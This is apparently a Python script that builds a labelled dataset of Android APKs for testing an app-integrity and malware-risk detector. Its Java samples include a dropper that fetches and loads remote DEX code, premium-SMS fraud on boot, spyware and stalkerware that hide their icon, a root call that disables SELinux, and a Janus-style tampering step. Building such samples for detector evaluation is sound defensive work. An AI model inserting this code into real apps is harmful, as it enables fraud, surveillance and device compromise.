"""scripts/build_eval_dataset.py — Build the controlled evaluation dataset.

    python -m scripts.build_eval_dataset

Produces real APKs with the official Android toolchain (scripts/apk_builder.py)
in evaluation/dataset/, plus evaluation/dataset/manifest.json with the ground
truth for every case. Requires the Android SDK and a JDK; the generated dataset
is committed so the evaluation can be re-run without them.

Threat model behind the cases: an attacker can modify and repackage an app but
does NOT hold the developer's signing key, so a modified app is either re-signed
with the attacker's own key or left with a broken signature. Key B deliberately
copies the developer certificate's subject name ("CN=MerkleTrust Demo Release")
to show that look-alike certificates are told apart by fingerprint, not by name.

Signing keys are created in a temporary directory and destroyed afterwards.
"""

from __future__ import annotations

import json
import tempfile
import zipfile
from dataclasses import replace
from pathlib import Path

from scripts.apk_builder import AppSpec, Keystore, Toolchain, build_signed, create_keystore
from scripts.apk_mutations import rewrite_zip
from scripts.build_fixtures import benign_spec, suspicious_spec, update_spec

ROOT = Path(__file__).resolve().parent.parent
OUT = ROOT / "evaluation" / "dataset"
FAKE_ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 57


def notes_spec() -> AppSpec:
    return AppSpec(
        package="com.merkletrust.notes", version_code=12, version_name="4.1", label="Notes",
        permissions=[], application_attrs={"allowBackup": "false"},
        components_xml='        <activity android:name=".EditorActivity" android:exported="false"/>',
        java_sources={"com/merkletrust/notes/EditorActivity.java": """package com.merkletrust.notes;
import android.app.Activity;
public class EditorActivity extends Activity { }
"""},
        main_activity_body='        android.util.Log.d("Notes", "ready");',
        extra_files={"assets/templates/default.md": b"# New note\n"},
        strings={"empty": "No notes yet"})


def weather_spec() -> AppSpec:
    return AppSpec(
        package="com.merkletrust.weather", version_code=7, version_name="2.3", label="Weather",
        permissions=["android.permission.INTERNET", "android.permission.ACCESS_COARSE_LOCATION"],
        application_attrs={"allowBackup": "false"},
        main_activity_body='        android.util.Log.i("Weather", "https://api.weather-demo.com/v2/forecast");',
        extra_files={"assets/cities.json": b'["Bengaluru","Mumbai","Delhi"]'},
        strings={"title": "Forecast"})


def dropper_spec() -> AppSpec:
    return AppSpec(
        package="com.sample.dropper", label="Flashlight Pro", permissions=["android.permission.INTERNET"],
        java_sources={"com/sample/dropper/Loader.java": """package com.sample.dropper;
import android.content.Context;
import dalvik.system.DexClassLoader;
public class Loader {
    public static Object load(Context ctx) throws Exception {
        android.util.Log.d("upd", "http://update.flashlight-pro.top/plugin.dex");
        DexClassLoader l = new DexClassLoader(ctx.getFilesDir() + "/p.dex", ctx.getCacheDir().getPath(), null, Loader.class.getClassLoader());
        return l.loadClass("com.payload.Main").newInstance();
    }
}
"""})


def smsfraud_spec() -> AppSpec:
    return AppSpec(
        package="com.sample.smsfraud", label="Free Wallpapers",
        permissions=["android.permission.SEND_SMS", "android.permission.RECEIVE_BOOT_COMPLETED"],
        components_xml="""        <receiver android:name=".Boot" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
        </receiver>""",
        java_sources={"com/sample/smsfraud/Boot.java": """package com.sample.smsfraud;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
public class Boot extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        SmsManager.getDefault().sendTextMessage("90901", null, "SUB GOLD", null, null);
    }
}
"""})


def spyware_spec() -> AppSpec:
    return AppSpec(
        package="com.sample.spy", label="System Service",
        permissions=["android.permission.INTERNET", "android.permission.READ_CONTACTS",
                     "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_PHONE_STATE",
                     "android.permission.RECORD_AUDIO"],
        java_sources={"com/sample/spy/Collector.java": """package com.sample.spy;
import android.content.Context;
import android.telephony.TelephonyManager;
public class Collector {
    public static String collect(Context c) throws Exception {
        TelephonyManager tm = (TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE);
        Runtime.getRuntime().exec("logcat -d");
        return tm.getSubscriberId() + "@" + "93.184.216.34";
    }
}
"""})


def misconfigured_spec() -> AppSpec:
    """Benign app with sloppy release settings: should be flagged for review, not as high risk."""
    return AppSpec(
        package="com.merkletrust.todo", label="Todo",
        application_attrs={"debuggable": "true", "usesCleartextTraffic": "true", "allowBackup": "true"},
        permissions=["android.permission.INTERNET"],
        main_activity_body='        android.util.Log.i("Todo", "http://todo-sync.merkletrust-demo.com/api");')


# Held-out samples: written AFTER the behaviour-pattern rules were added (see
# evaluation/README.md) and labelled by intent before the evaluation was run. They
# use different APIs from the development samples and include benign apps that
# legitimately use the same capabilities, so false positives are measured honestly.
def h_inmemory_dropper() -> AppSpec:
    return AppSpec(package="com.sample.cleaner", label="Phone Cleaner", permissions=["android.permission.INTERNET"],
                   java_sources={"com/sample/cleaner/Stage.java": """package com.sample.cleaner;
import java.net.URL;
import java.nio.ByteBuffer;
import dalvik.system.InMemoryDexClassLoader;
public class Stage {
    public static Class<?> run() throws Exception {
        byte[] b = new URL("https://cdn.cleaner-boost.xyz/s2").openStream().readAllBytes();
        return new InMemoryDexClassLoader(ByteBuffer.wrap(b), Stage.class.getClassLoader()).loadClass("s.Main");
    }
}
"""})


def h_sms_on_receive() -> AppSpec:
    return AppSpec(package="com.sample.horoscope", label="Daily Horoscope",
                   permissions=["android.permission.SEND_SMS", "android.permission.RECEIVE_SMS"],
                   components_xml="""        <receiver android:name=".In" android:exported="true">
            <intent-filter><action android:name="android.provider.Telephony.SMS_RECEIVED"/></intent-filter>
        </receiver>""",
                   java_sources={"com/sample/horoscope/In.java": """package com.sample.horoscope;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import java.util.ArrayList;
public class In extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        ArrayList<String> parts = new ArrayList<>(); parts.add("JOIN STAR");
        SmsManager.getDefault().sendMultipartTextMessage("7726", null, parts, null, null);
    }
}
"""})


def h_stalkerware() -> AppSpec:
    return AppSpec(package="com.sample.familywatch", label="Settings Helper",
                   permissions=["android.permission.INTERNET", "android.permission.READ_CALL_LOG",
                                "android.permission.ACCESS_FINE_LOCATION", "android.permission.READ_PHONE_NUMBERS"],
                   java_sources={"com/sample/familywatch/Hide.java": """package com.sample.familywatch;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageManager;
import android.telephony.TelephonyManager;
public class Hide {
    public static String go(Context c) {
        c.getPackageManager().setComponentEnabledSetting(new ComponentName(c, "com.sample.familywatch.MainActivity"),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        return ((TelephonyManager) c.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
    }
}
"""})


def h_root_booster() -> AppSpec:
    return AppSpec(package="com.sample.booster", label="Battery Booster",
                   permissions=["android.permission.RECEIVE_BOOT_COMPLETED"],
                   components_xml="""        <receiver android:name=".OnBoot" android:exported="true">
            <intent-filter><action android:name="android.intent.action.BOOT_COMPLETED"/></intent-filter>
        </receiver>""",
                   java_sources={"com/sample/booster/OnBoot.java": """package com.sample.booster;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
public class OnBoot extends BroadcastReceiver {
    @Override public void onReceive(Context c, Intent i) {
        try { Runtime.getRuntime().exec(new String[]{"su", "-c", "setenforce 0"}); } catch (Exception e) { }
    }
}
"""})


def h_benign_plugins() -> AppSpec:
    """Benign: a drawing app that loads its own bundled brush plugins (legitimate code loading)."""
    return AppSpec(package="com.merkletrust.sketch", label="Sketch", permissions=["android.permission.INTERNET"],
                   java_sources={"com/merkletrust/sketch/Plugins.java": """package com.merkletrust.sketch;
import android.content.Context;
import dalvik.system.DexClassLoader;
public class Plugins {
    public static ClassLoader load(Context c) {
        return new DexClassLoader(c.getFilesDir() + "/brushes.dex", c.getCodeCacheDir().getPath(), null, Plugins.class.getClassLoader());
    }
}
"""}, extra_files={"assets/brushes.dex": b"dex\n035\x00"})


def h_benign_sms_reminder() -> AppSpec:
    """Benign: the user taps a button to text an appointment reminder."""
    return AppSpec(package="com.merkletrust.clinic", label="Clinic Reminders", permissions=["android.permission.SEND_SMS"],
                   java_sources={"com/merkletrust/clinic/Remind.java": """package com.merkletrust.clinic;
import android.telephony.SmsManager;
public class Remind { public static void send(String to, String text) { SmsManager.getDefault().sendTextMessage(to, null, text, null, null); } }
"""})


def h_benign_fitness() -> AppSpec:
    return AppSpec(package="com.merkletrust.run", label="Run Tracker",
                   permissions=["android.permission.INTERNET", "android.permission.ACCESS_FINE_LOCATION",
                                "android.permission.ACTIVITY_RECOGNITION"],
                   main_activity_body='        android.util.Log.i("Run", "https://api.runtracker-demo.com/v1/upload");')


HELD_OUT = [
    ("H01", "held_inmemory_dropper.apk", h_inmemory_dropper, "C", "Dropper using InMemoryDexClassLoader + HTTPS download", True),
    ("H02", "held_sms_on_receive.apk", h_sms_on_receive, "B", "SMS fraud triggered by incoming SMS (multipart send)", True),
    ("H03", "held_stalkerware.apk", h_stalkerware, "C", "Stalkerware: call log, location, phone number, hides its icon", True),
    ("H04", "held_root_booster.apk", h_root_booster, "B", "Runs 'su' to disable SELinux on boot", True),
    ("H05", "held_benign_plugins.apk", h_benign_plugins, "A", "Benign drawing app loading its own plugins (legitimate code loading)", False),
    ("H06", "held_benign_sms_reminder.apk", h_benign_sms_reminder, "A", "Benign user-initiated SMS reminders", False),
    ("H07", "held_benign_fitness.apk", h_benign_fitness, "A", "Benign fitness tracker with location", False),
]


def _cases(keys: dict[str, Keystore]) -> list[dict]:
    """Every case: how it is built and its ground truth."""
    official = benign_spec()
    no_config = replace(official, extra_files={k: v for k, v in official.extra_files.items() if k != "assets/config.json"})
    return [
        # --------------------------------------------------- com.merkletrust.demo (baseline: official, key A)
        dict(id="D01", file="demo_official_copy.apk", derive="copy",
             description="Byte-identical copy of the official build", baseline="demo",
             truth=dict(integrity="CLEAN", changed=False, unauthorized=False, risky=False, files={})),
        dict(id="D02", file="demo_same_key_resign.apk", spec=official, key="A", schemes=("v2", "v3"),
             description="Rebuilt and re-signed by the developer with the same key (v2+v3)", baseline="demo",
             truth=dict(integrity="CLEAN", changed=False, unauthorized=False, risky=False, files={})),
        dict(id="D03", file="demo_legit_update.apk", spec=update_spec(), key="A", schemes=("v1", "v2"),
             description="Legitimate next release by the developer (+CAMERA, +1 service)", baseline="demo",
             truth=dict(integrity="MODIFIED", changed=True, unauthorized=False, risky=False,
                         required={"modified": ["AndroidManifest.xml", "classes.dex"]})),
        dict(id="D04", file="demo_manifest_mod.apk",
             spec=replace(official, application_attrs={"allowBackup": "true", "debuggable": "true"}),
             key="B", schemes=("v1", "v2"), description="Manifest modified (debuggable, backup) and re-signed",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, files={"modified": ["AndroidManifest.xml"]})),
        dict(id="D05", file="demo_dex_mod.apk",
             spec=replace(official, main_activity_body=official.main_activity_body +
                          '\n        try { Runtime.getRuntime().exec("id"); } catch (Exception e) { }'),
             key="B", schemes=("v2",), description="Program code (DEX) modified to run commands and re-signed",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, files={"modified": ["classes.dex"]})),
        dict(id="D06", file="demo_cert_replaced.apk", spec=official, key="B", schemes=("v1", "v2"),
             description="Unchanged content re-signed with a look-alike certificate (same subject name)",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, files={})),
        dict(id="D07", file="demo_added_file.apk",
             spec=replace(official, extra_files={**official.extra_files, "assets/payload.bin": b"\x00stage2"}),
             key="C", schemes=("v2",), description="File injected (assets/payload.bin) and re-signed",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, files={"added": ["assets/payload.bin"]})),
        dict(id="D08", file="demo_deleted_file.apk", spec=no_config, key="B", schemes=("v2",),
             description="File deleted (assets/config.json) and re-signed", baseline="demo",
             truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True, risky=True,
                        files={"deleted": ["assets/config.json"]})),
        dict(id="D09", file="demo_repackaged.apk",
             spec=replace(official, permissions=official.permissions + ["android.permission.SEND_SMS"],
                          java_sources={**official.java_sources, **dropper_spec().java_sources,
                                        "com/merkletrust/demo/Sms.java": """package com.merkletrust.demo;
import android.telephony.SmsManager;
public class Sms { public static void go() { SmsManager.getDefault().sendTextMessage("90901", null, "x", null, null); } }
"""},
                          extra_files={**official.extra_files, "lib/x86_64/libpayload.so": FAKE_ELF}),
             key="C", schemes=("v1", "v2"),
             description="Repackaged: injected loader + SMS code, new permission, extra native library",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, required={"modified": ["AndroidManifest.xml", "classes.dex"],
                                                               "added": ["lib/x86_64/libpayload.so"]})),
        dict(id="D10", file="demo_permission_mod.apk",
             spec=replace(official, permissions=official.permissions + ["android.permission.SEND_SMS",
                                                                         "android.permission.READ_CONTACTS"]),
             key="B", schemes=("v2",), description="Permissions added (SEND_SMS, READ_CONTACTS) and re-signed",
             baseline="demo", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                         risky=True, files={"modified": ["AndroidManifest.xml"]})),
        dict(id="D11", file="demo_invalid_signature.apk", derive="modify_config",
             description="Asset modified after signing (signature now invalid)", baseline="demo",
             truth=dict(integrity="MODIFIED", changed=True, unauthorized=True, risky=True,
                        files={"modified": ["assets/config.json"]})),
        dict(id="D12", file="demo_signature_stripped.apk", derive="strip_v2",
             description="v2 signature block stripped (downgrade to v1)", baseline="demo",
             truth=dict(integrity="MODIFIED", changed=True, unauthorized=True, risky=True, files={})),
        dict(id="D13", file="demo_janus_prefix.apk", derive="janus",
             description="DEX data prepended to the signed APK (Janus-style)", baseline="demo",
             truth=dict(integrity="MODIFIED", changed=True, unauthorized=True, risky=True, files={})),
        # --------------------------------------------------- com.merkletrust.notes (baseline: key A)
        dict(id="N01", file="notes_official_copy.apk", derive="copy",
             description="Byte-identical copy of the official build", baseline="notes",
             truth=dict(integrity="CLEAN", changed=False, unauthorized=False, risky=False, files={})),
        dict(id="N02", file="notes_same_key_resign.apk", spec=notes_spec(), key="A", schemes=("v2",),
             description="Re-signed by the developer, v2 only", baseline="notes",
             truth=dict(integrity="CLEAN", changed=False, unauthorized=False, risky=False, files={})),
        dict(id="N03", file="notes_cert_replaced.apk", spec=notes_spec(), key="C", schemes=("v2", "v3"),
             description="Re-signed with an attacker key (RSA)", baseline="notes",
             truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True, risky=True, files={})),
        dict(id="N04", file="notes_code_mod.apk",
             spec=replace(notes_spec(), main_activity_body='        android.util.Log.d("Notes", "http://203.0.113.9/x");'),
             key="B", schemes=("v2",), description="Code modified (new network endpoint) and re-signed",
             baseline="notes", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                          risky=True, files={"modified": ["classes.dex"]})),
        # --------------------------------------------------- com.merkletrust.weather (baseline: key A)
        dict(id="W01", file="weather_official_copy.apk", derive="copy",
             description="Byte-identical copy of the official build", baseline="weather",
             truth=dict(integrity="CLEAN", changed=False, unauthorized=False, risky=False, files={})),
        dict(id="W02", file="weather_legit_update.apk",
             spec=replace(weather_spec(), version_code=8, version_name="2.4",
                          extra_files={"assets/cities.json": b'["Bengaluru","Mumbai","Delhi","Chennai"]'}),
             key="A", schemes=("v1", "v2"), description="Legitimate data-only update by the developer",
             baseline="weather", truth=dict(integrity="MODIFIED", changed=True, unauthorized=False, risky=False,
                                            files={"modified": ["AndroidManifest.xml", "assets/cities.json"]})),
        dict(id="W03", file="weather_permission_mod.apk",
             spec=replace(weather_spec(), permissions=weather_spec().permissions + [
                 "android.permission.ACCESS_FINE_LOCATION", "android.permission.ACCESS_BACKGROUND_LOCATION"]),
             key="C", schemes=("v2",), description="Location tracking permissions added and re-signed",
             baseline="weather", truth=dict(integrity="CERTIFICATE_CHANGED", changed=True, unauthorized=True,
                                            risky=True, files={"modified": ["AndroidManifest.xml"]})),
        # --------------------------------------------------- risk samples (no baseline)
        dict(id="R01", file="risk_suspicious.apk", spec=suspicious_spec(), key="B", schemes=("v2",),
             description="Debuggable app with command execution, code loading and SMS sending", baseline=None,
             truth=dict(integrity="NO_BASELINE", risky=True)),
        dict(id="R02", file="risk_dropper.apk", spec=dropper_spec(), key="C", schemes=("v2",),
             description="Dropper: downloads and loads extra code", baseline=None,
             truth=dict(integrity="NO_BASELINE", risky=True)),
        dict(id="R03", file="risk_smsfraud.apk", spec=smsfraud_spec(), key="C", schemes=("v2",),
             description="Premium-SMS fraud on boot", baseline=None, truth=dict(integrity="NO_BASELINE", risky=True)),
        dict(id="R04", file="risk_spyware.apk", spec=spyware_spec(), key="B", schemes=("v2",),
             description="Spyware: identifiers, contacts, location, audio, command execution", baseline=None,
             truth=dict(integrity="NO_BASELINE", risky=True)),
        dict(id="R05", file="risk_misconfigured.apk", spec=misconfigured_spec(), key="A", schemes=("v2",),
             description="Benign app with debuggable/cleartext/backup enabled (should be review, not high risk)",
             baseline=None, truth=dict(integrity="NO_BASELINE", risky=False)),
    ] + [dict(id=i, file=f, spec=fn(), key=k, schemes=("v2",), description=d, baseline=None, set="held_out",
              truth=dict(integrity="NO_BASELINE", risky=risky)) for i, f, fn, k, d, risky in HELD_OUT]


def _derive(kind: str, official: Path, out: Path) -> None:
    if kind == "copy":
        out.write_bytes(official.read_bytes())
    elif kind == "modify_config":
        rewrite_zip(official, out, modify={"assets/config.json": b'{"endpoint": "https://evil.example"}'})
    elif kind == "strip_v2":
        rewrite_zip(official, out)
    elif kind == "janus":
        dex = zipfile.ZipFile(official).read("classes.dex")
        out.write_bytes(dex + official.read_bytes())
    else:
        raise ValueError(kind)


def main() -> int:
    tools = Toolchain.discover()
    OUT.mkdir(parents=True, exist_ok=True)
    with tempfile.TemporaryDirectory(prefix="mt_eval_keys_") as tmp:
        keys = {
            "A": create_keystore(Path(tmp), "developer", "EC", "CN=MerkleTrust Demo Release, O=MerkleTrust, C=IN", tools),
            "B": create_keystore(Path(tmp), "lookalike", "EC", "CN=MerkleTrust Demo Release, O=MerkleTrust, C=IN", tools),
            "C": create_keystore(Path(tmp), "attacker", "RSA", "CN=Android, O=Android, C=US", tools),
        }
        baselines = {"demo": (benign_spec(), "baseline_demo.apk"), "notes": (notes_spec(), "baseline_notes.apk"),
                     "weather": (weather_spec(), "baseline_weather.apk")}
        for name, (spec, file) in baselines.items():
            build_signed(spec, OUT / file, keys["A"], ("v1", "v2"), tools)
            print(f"built baseline {file}")
        cases = _cases(keys)
        for case in cases:
            target = OUT / case["file"]
            if "derive" in case:
                _derive(case["derive"], OUT / baselines[case["baseline"]][1], target)
            else:
                build_signed(case["spec"], target, keys[case["key"]], case["schemes"], tools)
            print(f"built {case['id']} {case['file']}")

    manifest = {
        "description": "MerkleTrust controlled evaluation dataset (real APKs built with aapt2/d8/apksigner)",
        "baselines": {name: file for name, (_spec, file) in baselines.items()},
        "keys": {"A": "developer key (EC P-256)", "B": "attacker key copying the developer's subject name (EC)",
                 "C": "attacker key (RSA-2048)"},
        "cases": [{k: v for k, v in c.items() if k not in ("spec",)}
                  | {"schemes": list(c.get("schemes", ())), "set": c.get("set", "development")} for c in cases],
    }
    (OUT / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(f"\n{len(cases)} cases + {len(baselines)} baselines written to {OUT}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
